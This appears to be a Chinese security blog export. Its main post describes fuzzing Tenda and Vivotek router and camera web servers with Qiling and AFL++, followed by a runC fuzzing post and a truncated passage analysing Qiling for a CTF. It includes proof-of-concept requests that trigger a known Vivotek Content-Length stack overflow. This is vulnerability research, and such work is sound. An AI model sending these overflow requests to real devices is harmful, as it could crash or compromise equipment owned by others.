Fuzz思路：Iot设备就连环境模拟都比较棘手就就更别说Fuzz了，但是Qiling提供的进程快照(snapshot)功能给了我们一个不错的思路，这也是Qiling官方Fuzz案例的一个思路：即对某函数部分Fuzz(Partial Fuzz)
Tenda-AC15Qiling使用4个脚本来实现对该款路由器上httpd程序的Fuzz

首先是saver_tendaac15_httpd.py用于保存fuzz的起始状态快照，主要代码如下：
def save_context(ql, *args, **kw):
    ql.save(cpu_context=False, snapshot="snapshot.bin")

def check_pc(ql):
    print("=" * 50)
    print("Hit fuzz point, stop at PC = 0x%x" % ql.arch.regs.arch_pc)
    print("=" * 50)
    ql.emu_stop()


def my_sandbox(path, rootfs):
    ql = Qiling(path, rootfs, verbose=QL_VERBOSE.DEBUG)
    ql.add_fs_mapper("/dev/urandom","/dev/urandom")
    ql.hook_address(save_context, 0x10930)        #&lt;=======
    ql.hook_address(patcher, ql.loader.elf_entry)
    ql.hook_address(check_pc, 0x7a0cc)            #&lt;=======
    ql.run()

ql.hook_address(save_context, 0x10930)：表示当程序跑到0x10930地址时调用save_context函数将保存此刻模拟状态
但需要输入来触发程序按照预想的跑到0x10930位置，带上面脚本跑起来后使用addressNat_overflow.sh触发
#!/bin/sh

curl -v -H "X-Requested-With: XMLHttpRequest" -b "password=1234" -e http://localhost:8080/samba.html -H "Content-Type:application/x-www-form-urlencoded" --data "entrys=sync" --data "page=CCCCAAAA" http://localhost:8080/goform/addressNat

那么我们就获得了模拟进程快照snapshot.bin之后fuzz就重复利用该文件启动就行，对应fuzz_tendaac15_httpd.py
def main(input_file, enable_trace=False):
    ql = Qiling(["rootfs/bin/httpd"], "rootfs", verbose=QL_VERBOSE.DEBUG, console = True if enable_trace else False)

    # save current emulated status
    ql.restore(snapshot="snapshot.bin")

    # return should be 0x7ff3ca64
    fuzz_mem=ql.mem.search(b"CCCCAAAA")
    target_address = fuzz_mem[0]

    def place_input_callback(_ql: Qiling, input: bytes, _):
        _ql.mem.write(target_address, input)

    def start_afl(_ql: Qiling):
        """
        Callback from inside
        """
        ql_afl_fuzz(_ql, input_file=input_file, place_input_callback=place_input_callback, exits=[ql.os.exit_point])

    ql.hook_address(callback=start_afl, address=0x10930+8)
    
    try:
        ql.run(begin = 0x10930+4, end = 0x7a0cc+4)
        os._exit(0)
    except:
        if enable_trace:
            print("\nFuzzer Went Shit")
        os._exit(0)        

if __name__ == "__main__":
    if len(sys.argv) == 1:
        raise ValueError("No input file provided.")

    if len(sys.argv) &gt; 2 and sys.argv[1] == "-t":
        main(sys.argv[2], enable_trace=True)
    else:
        main(sys.argv[1])


恢复快照：ql.restore(snapshot=”snapshot.bin”)

变异数据缓存定位：fuzz_mem=ql.mem.search(b”CCCCAAAA”)

以hook方式从起始地址附近的开始fuzz：ql.hook_address(callback=start_afl, address=0x10930+8)


最后开始Fuzz
#!/usr/bin/sh

AFL_DEBUG_CHILD_OUTPUT=1 AFL_AUTORESUME=1 AFL_PATH="$(realpath ./AFLplusplus)" PATH="$AFL_PATH:$PATH" ./AFLplusplus/afl-fuzz -i afl_inputs -o afl_outputs -U -- python3 ./fuzz_tendaac15_httpd.py @@

说实话这样连最关键的fuzz范围0x10930，0x7a0cc怎么来的都不知道当时逆向定位这两个地址也是一头雾水毫无特征，还是得自己实操
因此选定了Boa框架(之前了解过源码)从零开始对其进行Fuzz
Boa Fuzz选择一个网上有许多漏洞分析的设备：vivetok 摄像头，固件链接；而且webservre为Boa框架
Poc：
echo -en "POST /cgi-bin/admin/upgrade.cgi HTTP/1.0\nContent-Length:AAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIXXXX\n\r\n\r\n"  | ncat -v 192.168.57.20 80

Boa框架：
主要处理逻辑在process_requests函数中：
           /*获取就绪队列并处理*/
    current = request_ready;

    while (current) {
        time(&amp;current_time);
        if (current-&gt;buffer_end &amp;&amp; /* there is data in the buffer */
            current-&gt;status != DEAD &amp;&amp; current-&gt;status != DONE) {
            retval = req_flush(current);
            /*
             * retval can be -2=error, -1=blocked, or bytes left
             */
            if (retval == -2) { /* error */
                current-&gt;status = DEAD;
                retval = 0;
            } else if (retval &gt;= 0) {
                /* notice the &gt;= which is different from below?
                   Here, we may just be flushing headers.
                   We don't want to return 0 because we are not DONE
                   or DEAD */

                retval = 1;
            }
        } else {/*主要处理请求部分在这里*/
            switch (current-&gt;status) {
            case READ_HEADER:
            case ONE_CR:
            case ONE_LF:
            case TWO_CR:
                retval = read_header(current);    //解析request头部，该函数类似与FILE_IO
                break;                            //函数request内部有8192+1字节的buffer，data的头尾指针等，最终调用
            case BODY_READ:                       //bytes = read(req-&gt;fd, buffer + req-&gt;client_stream_pos, buf_bytes_left);读取
                retval = read_body(current);
                break;
            case BODY_WRITE:
                retval = write_body(current);
                break;
            case WRITE:
                retval = process_get(current);
                break;
            case PIPE_READ:
                retval = read_from_pipe(current);
                break;
            case PIPE_WRITE:
                retval = write_from_pipe(current);
                break;
            case DONE:
                /* a non-status that will terminate the request */
                retval = req_flush(current);
                /*
                 * retval can be -2=error, -1=blocked, or bytes left
                 */
                if (retval == -2) { /* error */
                    current-&gt;status = DEAD;
                    retval = 0;
                } else if (retval &gt; 0) {
                    retval = 1;
                }
                break;
            case DEAD:
                retval = 0;
                current-&gt;buffer_end = 0;
                SQUASH_KA(current);
                break;
            default:
                retval = 0;
                fprintf(stderr, "Unknown status (%d), "
                        "closing!\n", current-&gt;status);
                current-&gt;status = DEAD;
                break;
            }

        }

主要看中间的Switch case：

read_header：解析request头部，该函数类似FILE_IO函数
request内部有8192+1字节的buffer，data的头尾指针等，最终调用bytes = read(req-&gt;fd, buffer + req-&gt;client_stream_pos, buf_bytes_left);读取client发送的请求
会提取并解析头部信息


对于GET传参，主要使用read_header, read_from_pipe, write_from_pipe完成cgi的调用
对于POST传参，主要调用read_header, read_body, write_body完成cgi调用

就拿read_header函数来说，厂商应该会在里面增加一些url过虑以及响应处理，在这个摄像头中漏洞也确实出在这个函数：

没有对Content-Length成员做限制；根据源码中提示字符串Unknown status (%d), closing可以轻松定位到这几个函数:

那么接下来就尝试利用Qiling 启动这个程序并且Partial Fuzz函数”read_header”
模拟启动模拟启动的宗旨(我的)是遇到啥错误修最后一个报错点
启动模板：
import os, sys
sys.path.append('/home/iot/workspace/Emulator/qiling-dev')
from qiling import Qiling
from qiling.const import QL_INTERCEPT, QL_VERBOSE


def boa_run(path: list, rootfs: str, profile: str = 'default'):
    ql = Qiling(path, rootfs, profile=profile, verbose=QL_VERBOSE.OFF, multithread=False)
    """setup files"""
    ql.add_fs_mapper('/dev/null', '/dev/null')

    """hooks"""

    ql.run()
    

if __name__ == '__main__':
    os.chdir('/home/iot/workspace/Emulator/qiling-dev/vivetok')
    path = ['./rootfs/usr/sbin/httpd', "-c", "/etc/conf.d/boa", "-d"]
    rootfs = './rootfs'
    profile = './boa_arm.ql'
    boa_run(path=path, rootfs=rootfs, profile=profile)


尝试启动
首先遇到的是：gethostbyname:: Success
在IDA中定位到：

函数原型：
struct hostent *gethostbyname(const char *hostname);
struct hostent{
    char *h_name;  //official name
    char **h_aliases;  //alias list
    int  h_addrtype;  //host address type
    int  h_length;  //address lenght
    char **h_addr_list;  //address list
}

获取返回的结构体还挺复杂的，问题的原因是 在调用gethostname将获得ql_vm作为主机名所以当以此调用gethostbyname无法获得主机信息，所以hook这个函数，并提前开辟空间存放伪造信息：
"""
struct hostent{
    char *h_name;  //official name
    char **h_aliases;  //alias list
    int  h_addrtype;  //host address type
    int  h_length;  //address lenght
    char **h_addr_list;  //address list
}
"""
def hook_memSpace(ql: Qiling):
    ql.mem.map(0x1000, 0x1000, info='my_hook')
    data = struct.pack('&lt;IIIII', 0x1100, 0x1100, AF_INET, 4, 0x1100)
    ql.mem.write(0x1000, data)
    ql.mem.write(0x1100, b'qiling')

def lib_gethostbyname(ql: Qiling):
    args = ql.os.resolve_fcall_params({'name':STRING})
    print('[gethostbyname]: ' + args['name'])
    ql.arch.regs.write('r0', 0x1000)

还有一个严重问题就是模拟过程中程序自动采用ipv6协议，这就很烦因为qiling的ipv6协议支持的不是很好
ipv6 socketAttributeError: ‘sockaddr_in’ object has no attribute ‘sin6_addr’
问题处在对ipv6的系统调用bind：
elif sa_family == AF_INET6 and ql.os.ipv6:
    sockaddr_in6 = make_sockaddr_in(abits, endian)
    sockaddr_obj = sockaddr_in6.from_buffer(data)

    port = ntohs(ql, sockaddr_obj.sin_port)
    host = inet6_ntoa(sockaddr_obj.sin6_addr.s6_addr)

    if ql.os.bindtolocalhost:
        host = '::1'

    if not ql.os.root and port &lt;= 1024:
        port = port + 8000

def make_sockaddr_in(archbits: int, endian: QL_ENDIAN):
    Struct = struct.get_aligned_struct(archbits, endian)

    class in_addr(Struct):
        _fields_ = (
            ('s_addr', ctypes.c_uint32),
        )

    class sockaddr_in(Struct):
        _fields_ = (
            ('sin_family', ctypes.c_int16),
            ('sin_port',   ctypes.c_uint16),
            ('sin_addr',   in_addr),
            ('sin_zero',   ctypes.c_byte * 8)
        )

    return sockaddr_in

def make_sockaddr_in6(archbits: int, endian: QL_ENDIAN):
    Struct = struct.get_aligned_struct(archbits, endian)

    class in6_addr(Struct):
        _fields_ = (
            ('s6_addr', ctypes.c_uint8 * 16),
        )

    class sockaddr_in6(Struct):
        _fields_ = (
            ('sin6_family',   ctypes.c_int16),
            ('sin6_port',     ctypes.c_uint16),
            ('sin6_flowinfo', ctypes.c_uint32),
            ('sin6_addr',     in6_addr),
            ('sin6_scope_id', ctypes.c_uint32)
        )

    return sockaddr_in6

make_sockaddr_in, make_sockaddr_in6基于ctypes构造严格的sockaddr结构体，因为是ipv6所以得用make_sockaddr_in6
还有就是函数(function) inet6_ntoa: (addr: bytes) -&gt; str需要bytes对象而sockaddr_obj.sin6_addr.s6_addr是cbytes类型所以得bytes转
sockaddr_in6 = make_sockaddr_in6(abits, endian)
sockaddr_obj = sockaddr_in6.from_buffer(data)
port = ntohs(ql, sockaddr_obj.sin6_port)
host = inet6_ntoa(bytes(sockaddr_obj.sin6_addr.s6_addr))

OSError: [Errno 98] Address already in use
还是在调用bind时候，因为qiling会对低于1024的端口bind进行修改：
if not ql.os.root and port &lt;= 1024:
        port = port + 8000

而后面还对8080端口进行一次bind，所以这里得改，然后其实就能进入核心处理逻辑了 ：

当然还得看看链接有没有问题：尝试访问又出现问题
$ echo -en "GET /index.html HTTP/1.0\n\rContent-Length:20\n\r\n\r"  | nc -v ::1 9080
Connection to ::1 9080 port [tcp/*] succeeded!

File "/home/iot/workspace/Emulator/qiling-dev-stb/qiling/os/posix/syscall/socket.py", line 669, in ql_syscall_accept
    host, port = address
ValueError: too many values to unpack (expected 2)

ValueError: too many values to unpack (expected 2)
经调试原来在python中accept ipv6的连接后会返回一个长度为4的元组的address：

同样的问题还发生在ql_syscall_getsockname：sockname = sock.getsockname()
TypeError: expected c_ubyte_Array_16 instance, got int
[x]     Syscall ERROR: ql_syscall_accept DEBUG: expected c_ubyte_Array_16 instance, got int
Traceback (most recent call last):
  File "/home/iot/workspace/Emulator/qiling-dev-stb/qiling/os/posix/posix.py", line 280, in load_syscall
    retval = syscall_hook(self.ql, *params)
  File "/home/iot/workspace/Emulator/qiling-dev-stb/qiling/os/posix/syscall/socket.py", line 674, in ql_syscall_accept
    obj.sin6_addr.s6_addr = inet6_aton(str(host))
TypeError: expected c_ubyte_Array_16 instance, got int

解决：bytes转cbyts类
obj.sin6_addr.s6_addr = (ctypes.c_ubyte * 16).from_buffer_copy(inet6_aton(str(host)).to_bytes(16, 'big'))

主要问题就这些(修了挺久的)，然后就可以对一些函数进行fuzz了
Fuzz Partial确定Fuzz范围，这个范围主要是给到ql_afl_fuzz函数，这里是打算Fuzz read_header函数(sub_17F80)，那么从数据入口下手：

读取POST或者GET方法的http包那么肯定要解析处理的，处理完成返回一个状态(源码中retval)来指示下一步处理，找到退出点：
因此要从0x180F8附近开始Fuzz，然后0x18398表示函数正常退出将执行下一轮fuzz
脚本模板：
import os, sys
sys.path.append('/home/iot/workspace/Emulator/qiling-dev')
from qiling.const import QL_INTERCEPT, QL_VERBOSE
from qiling import Qiling

from qiling.extensions.afl import ql_afl_fuzz


def main(input_file: str, trace: bool = False):
    ql = Qiling(['./rootfs/usr/sbin/httpd', "-c", "/etc/conf.d/boa", "-d"], rootfs='./rootfs', profile='./boa_arm.ql', verbose=QL_VERBOSE.OFF, console = True if trace else False)
    ql.restore(snapshot='./context.bin')

    def place_input_callback(_ql: Qiling, input: bytes, _):
        # print(b"**************** " + input)
        _ql.mem.write(target_addr, input)
        
    def start_afl(_ql: Qiling):
        """
        Callback from inside
        """
        ql_afl_fuzz(_ql, input_file=input_file, place_input_callback=place_input_callback, exits=[0x018398])

    ql.hook_address(callback=start_afl, address=0x180F8)

    try:
        # ql.debugger = True
        ql.run(begin=0x180F8)
        os._exit(0)
    except:
        if trace:
            print("\nFuzzer Went Shit")
        os._exit(0)  

if __name__ == "__main__":
    if len(sys.argv) == 1:
        raise ValueError("No input file provided.")
    
    os.chdir('/home/iot/workspace/Emulator/qiling-dev/vivetok')
    if len(sys.argv) &gt; 2 and sys.argv[1] == "-t":
        main(sys.argv[2], trace=True)
    else:
        main(sys.argv[1])


ql.hook_address(callback=start_afl, address=0x180F8)：在执行到0x180F8这个位置时调用start_afl函数
ql.run(begin=0x180F8)：从0x180F8开始执行
ql_afl_fuzz：就是unicornafl提供的fuzz接口uc_afl_fuzz_custom的一个wrapper
place_input_callback：ql_afl_fuzz会调用的回调函数，负责写入fuzz数据

Fuzz buf根据网上的漏洞分析比对源码框架，利用:
cho -en "POST /cgi-bin/admin/upgrade.cgi HTTP/1.0nContent-Length:AAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIXXXXnrnrn"  | nc -v ::1 9080

可以触发漏洞，具体位于框架中http头部解析函数：read_header，位于httpd中17F80位置
那么该如何fuzz呢，根据网上unicorn-afl官方用例和qiling官方用例：buf-fuzz，即定位代码中读取数据位置，然后读取完后劫持搜索特定字符串定位fuzz的buff_addr，当然需要状态保存(当然这个方法肯定不是很严谨，因此后面还会介绍劫持read函数方法)
快照import os, sys, struct
from socket import AF_INET
sys.path.append('/home/iot/workspace/Emulator/qiling-dev')
from qiling import Qiling
from qiling.const import QL_INTERCEPT, QL_VERBOSE
from qiling.os.const import STRING
from unicorn.unicorn import UcError
"""
struct hostent{
    char *h_name;  //official name
    char **h_aliases;  //alias list
    int  h_addrtype;  //host address type
    int  h_length;  //address lenght
    char **h_addr_list;  //address list
}
"""
def hook_memSpace(ql: Qiling):
    ql.mem.map(0x1000, 0x1000, info='my_hook')
    data = struct.pack('&lt;IIIII', 0x1100, 0x1100, AF_INET, 4, 0x1100)
    ql.mem.write(0x1000, data)
    ql.mem.write(0x1100, b'qiling')

def lib_gethostbyname(ql: Qiling):
    args = ql.os.resolve_fcall_params({'name':STRING})
    print('[gethostbyname]: ' + args['name'])
    ql.arch.regs.write('r0', 0x1000)
    

def saver(ql: Qiling):
    print('[!] Hit Saver 0x%X'%(ql.arch.regs.arch_pc))
    ql.save(cpu_context=False, snapshot='./context.bin')
    print(ql.mem.search(b'fuck'))


#[read(5,  0x4edca,  0x2000)] locate buf
def read_syscall(ql: Qiling, fd: int, buf: int, size: int, *args) -&gt; None:
    print(f'[read({fd}, {buf: #x}, {size: #x})]')

def boa_run(path: list, rootfs: str, profile: str = 'default'):
    ql = Qiling(path, rootfs, profile=profile, verbose=QL_VERBOSE.OFF, multithread=False)
    """setup files"""
    ql.add_fs_mapper('/dev/null', '/dev/null')

    """set ram"""
    hook_memSpace(ql)

    """hooks"""
    ql.os.set_api('gethostbyname', lib_gethostbyname, QL_INTERCEPT.CALL)
    ql.os.set_syscall('read', read_syscall, QL_INTERCEPT.ENTER)

    """setup saver"""
    ql.hook_address(saver, 0x0180FC)        #read finish

    ql.run()
    


if __name__ == '__main__':
    os.chdir('/home/iot/workspace/Emulator/qiling-dev/vivetok')
    path = ['./rootfs/usr/sbin/httpd', "-c", "/etc/conf.d/boa", "-d"]
    rootfs = './rootfs'
    profile = './boa_arm.ql'
    boa_run(path=path, rootfs=rootfs, profile=profile)

然后使用poc触发就行
fuzzimport os, sys, struct
import capstone as Cs
sys.path.append('/home/iot/workspace/Emulator/qiling-dev')
from qiling.const import QL_INTERCEPT, QL_VERBOSE
from qiling import Qiling
from qiling.extensions.afl import ql_afl_fuzz

def simple_diassembler(ql: Qiling, address: int, size: int, md: Cs) -&gt; None:
    buf = ql.mem.read(address, size)

    for insn in md.disasm(buf, address):
        ql.log.debug(f':: {insn.address:#x} : {insn.mnemonic:24s} {insn.op_str}')

def main(input_file: str, trace: bool = False):
    ql = Qiling(['./rootfs/usr/sbin/httpd', "-c", "/etc/conf.d/boa", "-d"], rootfs='./rootfs', profile='./boa_arm.ql', verbose=QL_VERBOSE.OFF, console = True if trace else False)
    ql.restore(snapshot='./context.bin')

    fuzz_mem = ql.mem.search(b'fuck')
    
    target_addr = fuzz_mem[0]

    def place_input_callback(_ql: Qiling, input: bytes, _):
        # print(b"**************** " + input)
        _ql.mem.write(target_addr, input)
        

    def start_afl(_ql: Qiling):
        """
        Callback from inside
        """
        ql_afl_fuzz(_ql, input_file=input_file, place_input_callback=place_input_callback, exits=[0x018398])

    ql.hook_address(callback=start_afl, address=0x0180FC+4)
    # ql.hook_code(simple_diassembler, begin=0x0180FC, end=0x018600, user_data=ql.arch.disassembler)

    try:
        # ql.debugger = True
        ql.run(begin=0x0180FC+4, end=0x018600)    #注意arm函数返回地址比较奇怪，不一定在函数末尾
        os._exit(0)
    except:
        if trace:
            print("\nFuzzer Went Shit")
        os._exit(0)  

if __name__ == "__main__":
    if len(sys.argv) == 1:
        raise ValueError("No input file provided.")
    
    os.chdir('/home/iot/workspace/Emulator/qiling-dev/vivetok')
    if len(sys.argv) &gt; 2 and sys.argv[1] == "-t":
        main(sys.argv[2], trace=True)
    else:
        main(sys.argv[1])

这里很坑的一点是，在漏洞中因为Content-Length成员不以\n结尾时就会让v31等于0会让strncpy报错但是不一定是pc指针错误，而是某些指令地址操作数问题
v30 = strstr(haystack, "Content-Length");
v31 = strchr(v30, '\n');
v32 = strchr(v30, ':');
strncpy(dest, v32 + 1, v31 - (v32 + 1));

在源码中AFL模块调用以下函数完成fuzz执行：
def _dummy_fuzz_callback(_ql: "Qiling"):
            if isinstance(_ql.arch, QlArchARM):
                pc = _ql.arch.effective_pc
            else:
                pc = _ql.arch.regs.arch_pc
            try:
                _ql.uc.emu_start(pc, 0, 0, 0)
            except UcError as e:
                os.abort()                 #添加部分
                return e.errno
            

因此添加os.abort通知AFL程序崩溃
效果
Fuzz sys_read上面直接对buf写入Fuzz数据肯定不是一个很理想的办法(比如Fuzz数据超出读取长度)，当然人家给的例子就是这么Fuzz的也不失一种方法；之后
就尝试利用Qiling的系统调用劫持功能让Fuzz效果更好。
从read函数调用处开始执行，在这之前劫持read函数调用让程序直接读取文件输入：
def read_syscall(ql: Qiling, fd: int, buf: int, size: int, *args) -&gt; int:
    # print(fd, buf, size)
    data = ql.os.stdin.read(size)
    # print(data)
    ql.mem.write(buf, data)
    return len(data)

def place_input_callback(_ql: Qiling, input: bytes, _):
    # print(b"**************** " + input)
    ql.os.stdin.write(input)

    return True


def start_afl(_ql: Qiling):
    """
    Callback from inside
    """
    ql_afl_fuzz(_ql, input_file=input_file, place_input_callback=place_input_callback, exits=[0x018398])

效果同样写个脚本把服务并且设置debugger等待gdb连接：

然后将crash中的数据发送：

也确实触发到了漏洞：
0x900a5d74 in strncpy () from target:/lib/libc.so.0
gef➤  backtrace 
#0  0x900a5d74 in strncpy () from target:/lib/libc.so.0
#1  0x0001853c in ?? ()
Backtrace stopped: previous frame identical to this frame (corrupt stack?)
gef➤  

技巧fuzz过程中不好调试连写的harness有没有效果都不知道，可以使用capstone同步解析执行汇编情况：
def simple_diassembler(ql: Qiling, address: int, size: int, md: Cs) -&gt; None:
    buf = ql.mem.read(address, size)

    for insn in md.disasm(buf, address):
        ql.log.debug(f':: {insn.address:#x} : {insn.mnemonic:24s} {insn.op_str}')

参考
Demo - Qiling Framework Documentation
IOT Fuzz 两种思路
vivetok 摄像头远程栈溢出漏洞分析-安全客 - 安全资讯平台 (anquanke.com)
Vivotek远程栈溢出漏洞分析与复现 - 先知社区 (aliyun.com)
http://galaxylab.com.cn/%e5%9f%ba%e4%ba%8eunicorn%e5%92%8clibfuzzer%e7%9a%84%e6%a8%a1%e6%8b%9f%e6%89%a7%e8%a1%8cfuzzing/
http://galaxylab.pingan.com.cn/%E5%9F%BA%E4%BA%8E-unicorn-%E7%9A%84%E5%8D%95%E4%B8%AA%E5%87%BD%E6%95%B0%E6%A8%A1%E6%8B%9F%E6%89%A7%E8%A1%8C%E5%92%8C-fuzzer-%E5%AE%9E%E7%8E%B0/

]]></content>
      <categories>
        <category>Fuzz</category>
      </categories>
      <tags>
        <tag>Fuzz</tag>
      </tags>
  </entry>
  <entry>
    <title>runC-fuzz</title>
    <url>//post/RunC-Fuzz.html</url>
    <content><![CDATA[runC-fuzz​本文主要是根据AdaLogics开源的runc-fuzzers和自己之前做的一些fuzz，研究一下可能的问题和相关的解决方案。在此之前可能会有朋友对runc比较陌生，可以参考一下之前的文章：https://bbs.pediy.com/thread-271130.htm
AdaLogics如何fuzz​runC是go语言编写的，那么对于fuzz引擎的选择毫无疑问应该是go-fuzz，纵观runC的项目结构，其实就是包裹了libcontainer，这也不难理解，因为在我的印象里面runC项目本身就是为了符合OCI标准拆分出来的。
​如果是fuzz的话，go语言里面最经常出现的问题其实就是索引超出边界，切片边界超出范围nil指针解引用等等，因此对于go-fuzz这种深入项目内部编写Fuzz函数的引擎，其实对于项目内部目标的选取十分关键。在AdaLogics的报告中指出runC具备较少的fuzz引擎入口点，因为现代模糊测试引擎其实更加适合解析，比如文本解析，编码解码或者各种其它API，但是这其实在runC里面比较少。
​首先分析AdaLogics是怎么做的，在思考了上述问题之后他们把目标放在了API和信息解析上面，相对于信息解析还好说，本身利用go-fuzz引擎生成的大量数据可以轻松实现fuzz，但是对于API来说，其输入内容还是相对结构化的，可以看看下面的例子：
// 抽取的runC代码片段
func parseCgroupFromReader(r io.Reader) (string, error) {
    s := bufio.NewScanner(r)
    for s.Scan() {
        var (
            text  = s.Text()
            parts = strings.SplitN(text, ":", 3)
        )
        if len(parts) &lt; 3 {
            return "", fmt.Errorf("invalid cgroup entry: %q", text)
        }
        // text is like "0::/user.slice/user-1001.slice/session-1.scope"
        if parts[0] == "0" &amp;&amp; parts[1] == "" {
            return parts[2], nil
        }
    }
    if err := s.Err(); err != nil {
        return "", err
    }
    return "", errors.New("cgroup path not found")
}

这样的代码显然就比较适合利用go-fuzz引擎生成的测试用例直接跑fuzz，但是对于下面的例子：
func statPids(dirPath string, stats *cgroups.Stats) error {
    current, err := fscommon.GetCgroupParamUint(dirPath, "pids.current")
    if err != nil {
        if os.IsNotExist(err) {
            return statPidsFromCgroupProcs(dirPath, stats)
        }
        return err
    }

    max, err := fscommon.GetCgroupParamUint(dirPath, "pids.max")
    if err != nil {
        return err
    }
    // If no limit is set, read from pids.max returns "max", which is
    // converted to MaxUint64 by GetCgroupParamUint. Historically, we
    // represent "no limit" for pids as 0, thus this conversion.
    if max == math.MaxUint64 {
        max = 0
    }

    stats.PidsStats.Current = current
    stats.PidsStats.Limit = max
    return nil
}

这显然就是比较结构化的输入了，其实这种问题在面对其它语言的时候也有遇到，结构化Fuzz一直是Fuzz的难点之一，但是和go-fuzz项目，因为引擎和fuzz方式的不同其实在结构化上面也有很大的差异，比如一些C/C++项目，可能会用protobuf或者中间语言IR的方式来实现数据结构化，但是go-fuzz的话在对应的Fuzz函数内部引入这些功能无疑是比较麻烦。这里AdaLogics实现了go-fuzz-headers来帮助实现结构化。
​        从statPids就可以看出，在结构化的目标中大多都是相关结构体：
type Stats struct {
    CpuStats    CpuStats    `json:"cpu_stats,omitempty"`
    CPUSetStats CPUSetStats `json:"cpuset_stats,omitempty"`
    MemoryStats MemoryStats `json:"memory_stats,omitempty"`
    PidsStats   PidsStats   `json:"pids_stats,omitempty"`
    BlkioStats  BlkioStats  `json:"blkio_stats,omitempty"`
    // the map is in the format "size of hugepage: stats of the hugepage"
    HugetlbStats map[string]HugetlbStats `json:"hugetlb_stats,omitempty"`
    RdmaStats    RdmaStats               `json:"rdma_stats,omitempty"`
}

因此其实只需要吧go-fuzz根据种子数据生成的脏数据进行结构体类型转化就能实现这个目标，这也正是go-fuzz-headers所做的，当然实际要做的工作比这个目标要麻烦的多。
​        在实现了结构化之后接下来其实就比较简单了，选取目标进行Fuzz，AdaLogics对项目结构进行分析之后决定选取下面库作为目标：

fs2
specconv
devices
fscommon
intelrdt
libcontainer
user
userns
configs

总共建立了12个Fuzz，在库中选取符合文本解析，编码解码或者各种其它API这些目标的函数进行了Fuzz。
我如何Fuzz​        其实在runc-fuzzers开源以前本人就开始思考如何对容器相关的目标进行fuzz，对比该开源项目其实在runc的fuzz上面我们撞了很多库和函数，因此对于这一部分就不多说了，本人做的不足的是没有实现类似go-fuzz-headers这样的辅助库来帮助生成更强大的语料库，而是通过裁剪目标函数来让目标更适合fuzz引擎，对比之下本人的语料库显然low了很多，但是这种裁剪也使得目标每一部分的代码更清晰明了，个人觉得还是有助于发现一些细节问题的，并且fuzz的速度也应该更快。
​        在对于目标的选取上，本人也更加“放肆”，因为因为容器的安全模型还不完善不必过于考虑引擎入口点的问题（也可能是我拆代码的原因）对apparmor这类的库也进行了Fuzz编写，但是问题在于合理的属于也可能带来灾难性的后果，详情可以参考之前分析的apparmor漏洞，但是这些逻辑类型的漏洞很难通过fuzz来找到，希望大佬们有啥更好的办法可以提出吧。
结果如何​        其实结果对于一个安全研究者来说是绝望的，可以看下AdaLogics发布的漏洞报告：

The fuzzers found no bug during the assessment, which is a great achievement to the RunC and Umoci authors. However, we acknowledge that there is a reasonable expectation that bugs will occur once the pending pull requests are merged in. We go into details with this in the next section.

本人自己的Fuzz在跑了2天之后也是no bug found，这也说明或许对于这些go项目来说，它们一边自身不断的集成Fuzz：比如runC的fuzz pr，或者是argo的fuzz项目都开始利用oss-fuzz将fuzz演变为常态化的手段来不断测试新加入的项目代码，同时从报告里看出，fuzz也确实需要常态化：

未来展望​        一方面，这些其实只是对于runc项目进行了部分测试，就代码覆盖率而言其实完全不能算是达标，同时fuzz本身的运行时间过短其实不能算是一次合格的模糊测试，就长期来看Fuzz需要在CI tests中不断继承来确保软件的内生安全问题，通过持续不断的Fuzz运行也会不断的对新代码进行安全测试。
​        就长远来看AdaLogics提出了一种观点，在fuzz中产生容器同时在容器内运行大量不同进程来进行整体性的安全测试，但是就目前fuzz的成熟度而言，还远不能达到这种效果。
    err := container.Run(process) 
if err != nil {
    container.Destroy() 
  logrus.Fatal(err) 
  return
}

]]></content>
      <categories>
        <category>漏洞挖掘</category>
      </categories>
      <tags>
        <tag>Fuzz</tag>
      </tags>
  </entry>
  <entry>
    <title>RealWorld CTF之qiling框架分析</title>
    <url>//post/Qilin%E6%A1%86%E6%9E%B6%E5%88%86%E6%9E%90.html</url>
    <content><![CDATA[RealWorld CTF之qiling框架分析qiling​当时题目就给了一个qiling的使用的用例，甚至和官方文档上面的用例差不多因此肯定是库的问题。
#!/usr/bin/env python3

import os
import sys
import base64
import tempfile
# pip install qiling==1.4.1
from qiling import Qiling

def my_sandbox(path, rootfs):
    ql = Qiling([path], rootfs)
    ql.run()

def main():
    sys.stdout.write('Your Binary(base64):\n')
    line = sys.stdin.readline()
    binary = base64.b64decode(line.strip())
    
    with tempfile.TemporaryDirectory() as tmp_dir:
        fp = os.path.join(tmp_dir, 'bin')

        with open(fp, 'wb') as f:
            f.write(binary)

        my_sandbox(fp, tmp_dir)

if __name__ == '__main__':
    main()

大致分析qiling源代码发现其加载模拟文件的流程如下（可以看qiling项目core.py文件，其中实现了一个Qiling的类）：

在实例初始化阶段设置一系列基础信息比如当前平台的操作系统及其架构等。
设置运行参数
设置需要的roofs目录，这里也是出问题的一个关键点
设置操作系统和结构
设置大小端序和机器长度
初始化QlCoreStructs结构体，主要是用来pack的
加载loader，主要就是根据os type导入loader文件夹下的不同文件。
log日志操作
加载qiling自己实现的内存管理器和寄存器管理器（这个根据interpreter成员来决定是否加载）
根据不同arch架构来加载qiling自己的实现的arch，就在目录的arch下
根据interpreter成员来决定是否初始化QlCoreHooks
启动之前加载loader，加载目标（linux的话里面其实实现了ELF的解析以及加载到内存的整个过程，甚至如果提供了interpreter也可以进行加载，详情可以看loader文件夹下的elf.py），然后起了一个守护页，看注释应该是保护内存的，至此初始化工作完成。
根据interpreter成员来决定是否选择不同的执行模式，一般直接初始化osHook通过os运行目标文件

上面是大致的加载过程，下面分析一下文件是怎么运行起来的（以模拟linux操作系统为例），运行的方式大致是分为运行qiling独立实现的解释器和不使用qiling独立实现的解释器两种，（作者大佬说是区块链智能合约解释器，这块我不是很懂，好像是智能合约bytecode执行，这里主要说os run）
在QlOsLinux类里面找到相应的run函数：
    def run(self):
        if self.ql.exit_point is not None:
            self.exit_point = self.ql.exit_point

        try:
            if self.ql.code:
                self.ql.emu_start(self.entry_point, (self.entry_point + len(self.ql.code)), self.ql.timeout, self.ql.count)
            else:
                if self.ql.multithread == True:
                    # start multithreading
                    thread_management = thread.QlLinuxThreadManagement(self.ql)
                    self.ql.os.thread_management = thread_management
                    thread_management.run()

                else:
                    if  self.ql.entry_point is not None:
                        self.ql.loader.elf_entry = self.ql.entry_point

                    elif self.ql.loader.elf_entry != self.ql.loader.entry_point:
                        entry_address = self.ql.loader.elf_entry
